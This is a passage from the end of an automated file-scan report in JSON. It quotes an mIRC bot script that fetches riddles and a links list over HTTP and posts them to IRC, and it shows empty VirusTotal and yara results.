            "  if (location: isin %i) { chrdopen $sockname $+(/,$gettok($remove(%i,.html),3-,47),_resp.html) }",
            "  if ($left(%i,1) == $chr(9) && $mid(%i,2,1) isletter) { hadd $sockname quest $remove(%i,$chr(9)) }",
            "  if (<b>R:</b> isin %i && $hget($sockname,quest)) {",
            "    chrdmsg $sockname $nohtml($nocolor($ifmatch R: $gettok(%i,2-,32)))",
            "    sockclose $sockname",
            "on *:sockclose:charada.*:chrdmsg $sockname Nao foi possivel receber a charada",
            ";links",
            "alias -l firlin_msg smsg $sock(firelinkz).mark $1-",
            "alias -l firelinkz {",
            "  sockclose firelinkz",
            "  sockopen firelinkz firecode.atspace.org 80",
            "  sockmark firelinkz $1-",
            "  unset %firelinkz_read",
            "on *:sockopen:firelinkz:{",
            "  if ($sockerr) { return }",
            "  sockwrite -n $sockname GET /links.txt HTTP/1.1",
            "  sockwrite -n $sockname Host: firecode.atspace.org",
            "  sockwrite -n $sockname Connection: close",
            "  sockwrite -n $sockname",
            "on *:sockread:firelinkz:{",
            "  if ($sockerr) { return }",
            "  var %i | sockread %i",
            "  if ($len(%i) < 1) { set %firelinkz_read 1 }",
            "  if (%firelinkz_read) { firlin_msg %i }",
            ";endscript"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.336137",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
